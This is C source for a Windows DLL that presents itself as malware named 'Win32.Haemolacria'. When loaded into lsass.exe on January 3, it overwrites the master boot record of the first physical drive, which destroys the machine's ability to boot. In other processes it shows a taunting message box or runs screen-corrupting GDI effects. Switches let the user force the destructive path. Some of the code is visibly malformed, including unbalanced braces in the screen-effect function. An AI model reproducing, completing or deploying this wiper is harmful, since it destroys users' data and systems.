#include <Windows.h>
#define DLLEXPORT __declspec(dllexport)
DWORD state;
DWORD ThreadCounter = 0;
#define avg(x, y) (x + y) / 2
//i call this one xorshit
DLLEXPORT DWORD rng() {
	state ^= state >> 7;
	HDC dc = GetDC(NULL);
	state ^= (DWORD)dc * 11;
	ReleaseDC(NULL, dc);
	return state;
}

DLLEXPORT VOID WINAPI sneaky() {
	MessageBoxW(NULL, L"secret level unlocked", L"oop", MB_ICONEXCLAMATION);
}

DLLEXPORT VOID WINAPI WhoAreYou() {
	MessageBoxW(NULL, L"I'm your dream, make you real. I'm your eyes when you must steal. I'm your pain when you can't feel. Sad but true. I'm your dream, mind astray. I'm your eyes while you're away. I'm your pain while you repay. You know it's sad but true \n -_Win32.Haemolacria by NullException_-", L"Haemolacria", MB_ICONERROR);
}


DLLEXPORT VOID WINAPI DestructivePayloadLSASS() {
	DWORD dwWank;
	static const BYTE lpMBR[] = "HaemoMBR here";
	SetLastError(0);
	HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DWORD dwError = GetLastError();
	WriteFile(hDisk, lpMBR, 512, &dwWank, NULL);
	Sleep(200);
	ExitProcess(dwError);
}


//
DLLEXPORT VOID WINAPI Xormelt() {
	HDC hScreen;
	RECT scRect;
	GetWindowRect(GetDesktopWindow(), &scRect);
	DWORD dwCTR = 0;
	DWORD dwSmegma = 0;
	RECT RectangleR;
	//BitBlt(hScreen, scRect.left + 5, scRect.top + 5, scRect.right + 5, scRect.bottom + 5, hScreen, scRect.left, scRect.top, SRCPAINT);
	//StretchBlt(hScreen, scRect.left, scRect.top, scRect.right / 3, scRect.bottom / 3, hScreen, scRect.left, scRect.top, scRect.right / 2, scRect.bottom / 2, SRCCOPY);
	//StretchBlt(hScreen, (scRect.right / 3) * 2, (scRect.bottom / 3) * 2, scRect.right, scRect.bottom, hScreen, scRect.right / 2, scRect.bottom / 2, scRect.right, scRect.bottom, SRCCOPY);
	for (DWORD i = 0; i <= 20; i++) {
		HDC hDC = GetDC(NULL);
		BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, NOTSRCERASE);
		if (i >= 5) BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, SRCAND);
		if (i >= 10) {
			dwSmegma = rng() % (scRect.right > scRect.bottom ? scRect.right : scRect.bottom);
			StretchBlt(hDC, 1 + dwSmegma % scRect.right, 1 + dwSmegma % scRect.bottom, scRect.right - dwSmegma % scRect.right, dwSmegma % scRect.bottom, hDC, 1, 1, scRect.right, scRect.bottom, SRCAND);
		}
		if (i >= 15) BitBlt(hDC, 1 + (INT)(((INT)rng() % 4) - 2), 1 + (INT)(((INT)rng() % 4) - 2), scRect.right + (INT)(((INT)rng() % 4) - 2), scRect.bottom + (INT)(((INT)rng() % 4) - 2), hDC, 1, 1, SRCPAINT);
		if (i == 20) {
			for (DWORD i = 0; i < (scRect.right > scRect.bottom ? scRect.right : scRect.bottom); i++){
				HDC hDCPen = GetStockObject(DC_PEN), hDCBrush = GetStockObject(DC_BRUSH);
				SetDCPenColor(hDCPen, rng() % 0x00FFFF00);
				SetDCBrushColor(hDCBrush, rng() % 0x00FFFF00);
				if (i % 20 == 0) Ellipse(hDC, rng() % scRect.right, rng() % scRect.bottom, rng() % scRect.right, rng() % scRect.bottom);
				if (i % 100 == 0) BitBlt(hDC, 1, 1, 200 + (rng() % scRect.right - 200), 200 + (rng() % scRect.bottom - 200), hDC, 200 + (rng() % scRect.right - 200), 200 + (rng() % scRect.bottom - 200), SRCINVERT);
				MoveToEx(hDC, rng() % scRect.right, rng() % scRect.bottom, NULL);
				SetDCPenColor(hDCPen, rng() % 0x00FFFF00);
				LineTo(hDC, rng() % scRect.right, rng() % scRect.bottom);
				HBRUSH hBrush = CreateSolidBrush(rng() & 0x00FFFF00);
				RectangleR.left = i % scRect.right;
				RectangleR.top = i % scRect.bottom;
				RectangleR.bottom = RectangleR.top + rng() % 100;
				RectangleR.right = RectangleR.left + rng() % 100;
				FillRect(hDC, &RectangleR, hBrush);
				DeleteObject(hBrush);
				Sleep(10);
			}

		}
		Sleep(1000);
	}
		hScreen = GetDC(NULL);
		DWORD dwRannum = rng();
		dwCTR++;
		if (dwCTR == 4) {
			StretchBlt(hScreen, scRect.left, scRect.top, scRect.right, scRect.bottom, hScreen, scRect.left + ((dwRannum % 32) + 4), scRect.top + ((dwRannum % 32) + 4), scRect.right - ((dwRannum % 32) + 4), scRect.bottom - ((dwRannum % 32) + 4), SRCINVERT);
			StretchBlt(hScreen, scRect.left, scRect.top, scRect.right, scRect.bottom, hScreen, scRect.left + ((dwRannum % 32) + 4), scRect.top + ((dwRannum % 32) + 4), scRect.right - ((dwRannum % 32) + 4), scRect.bottom - ((dwRannum % 32) + 4), SRCPAINT);
			BitBlt(hScreen, scRect.left + 5, scRect.top + 5, scRect.right + 5, scRect.bottom + 5, hScreen, scRect.left, scRect.top, SRCPAINT);
			dwCTR = 0;
		}
		StretchBlt(hScreen, scRect.left + 50 + (dwRannum % 400) / 2, scRect.top + 50 + (dwRannum % 400) / 2, scRect.right - 100 - (dwRannum % 400), scRect.bottom - 100 - (dwRannum % 400), hScreen, scRect.left, scRect.top, scRect.right, scRect.bottom, SRCCOPY);
		ReleaseDC(NULL, hScreen);
		Sleep(50);
	}
}

DWORD WINAPI DllMain(HMODULE hDllModule, DWORD dwReason, LPVOID lpReserved) {
	//have fun with these (slightly broken) switches lo
	DWORD AlwaysLSASS = 0;
	DWORD AlwaysEXPLORER = 0; 
	DWORD AlwaysJanuary3 = 0;
	//a
	SetLastError(0);
	WCHAR* lpProcPath = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_PATH);
	LPCWSTR lpProcname;
	GetModuleFileNameW(NULL, lpProcPath, MAX_PATH);
	for (INT i = MAX_PATH-1; i > 0; i--) 
		if (lpProcPath[i] == L'\\') {
			lpProcname = (DWORD)lpProcPath + 2 * ++i;
			break;
		}	
	if (dwReason == DLL_PROCESS_ATTACH || dwReason == DLL_THREAD_ATTACH) {
		SYSTEMTIME systime;
		GetSystemTime(&systime);
		if (!lstrcmpW(lpProcname, L"lsass.exe") || (AlwaysLSASS && !AlwaysEXPLORER)) {			
			if (systime.wDay == 3 && systime.wMonth == 1 || AlwaysJanuary3){
				DestructivePayloadLSASS();
			}
		}
		//else if (!lstrcmpW(lpProcname, L"explorer.exe") || AlwaysEXPLORER && !AlwaysLSASS) {
		else {
			if (systime.wDay == 3 && systime.wMonth == 1 || AlwaysJanuary3){
				WhoAreYou();
			}
			else {
				Xormelt();
			}
		}		
		//else return 1;
	}
	return 1;
}
